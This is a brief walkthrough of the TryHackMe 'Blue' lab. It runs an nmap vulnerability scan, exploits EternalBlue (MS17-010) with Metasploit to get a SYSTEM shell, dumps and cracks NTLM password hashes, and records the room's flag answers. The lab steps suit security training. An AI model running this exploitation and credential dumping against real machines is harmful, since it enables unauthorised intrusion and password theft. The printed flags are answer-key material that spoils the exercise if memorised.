# Try Hack Me - Blue Box

My IP = 10.8.19.163

Target IP = 10.10.160.161

Scanning the target with nmap. Command used: "nmap -sV -sC -vv --script vuln 10.10.219.160 > /home/cory/DirFusion/Blue/nmap-res.txt"

Completed. Have 9 ports open.

3 under 1000. 

NMAP Vuln scan results.

VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."


TryHackme does not like the answer that google pulls for that CVE. Doing a complete scan with Nessus. 

Nessus returned 2 Crit, 2 High 2 Medium and 22 Info vulnerabilities. 

Specific is MS17-010. Multiple remote code execution vulnerabilities exist in Microsoft Server Message Block 1.0 (SMBv1) due to improper handling of certain requests.

Started metasploit, using the exploit path: exploit/windows/smb/ms17_010_eternalblue

Set Rhosts to Target IP. Ran exploit. Got a shell.

Gained meterpreter session. GETUID: Server username: NT AUTHORITY\SYSTEM

For use with the questions.

2772  700   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM

Performed hashdump on MP shell

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

Running johntheripper

FOund password.

Flag1 in C:\ {access_the_machine}

Flag 2 in C:\Windows\System32\config {sam_database_elevated_access}

Flag 3 in C:\Users\Jon\Documents {admin_documents_can_be_valuable}




